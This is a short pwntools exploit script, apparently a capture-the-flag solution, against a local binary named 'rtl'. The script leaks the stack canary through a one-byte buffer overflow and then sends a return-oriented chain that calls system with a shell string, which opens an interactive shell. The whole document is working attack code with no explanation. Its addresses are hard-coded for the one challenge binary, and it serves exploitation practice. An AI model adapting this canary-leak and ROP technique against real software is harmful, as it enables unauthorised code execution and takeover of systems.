from pwn import *

p = process('./rtl')
e = ELF('./rtl')

system_plt = e.plt['system']
pop_rdi_ret = 0x400853
ret = 0x400285
shell = 0x400874

buf = b"a"*0x39
p.sendafter(b"Buf: ", buf)
p.recvuntil(buf)
cnry = u64(b'\x00' + p.recv(7))

payload  = b"a"*0x38 + p64(cnry) + b"a"*8
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(shell)
payload += p64(system_plt)

p.sendafter(b"Buf: ", payload)
p.interactive()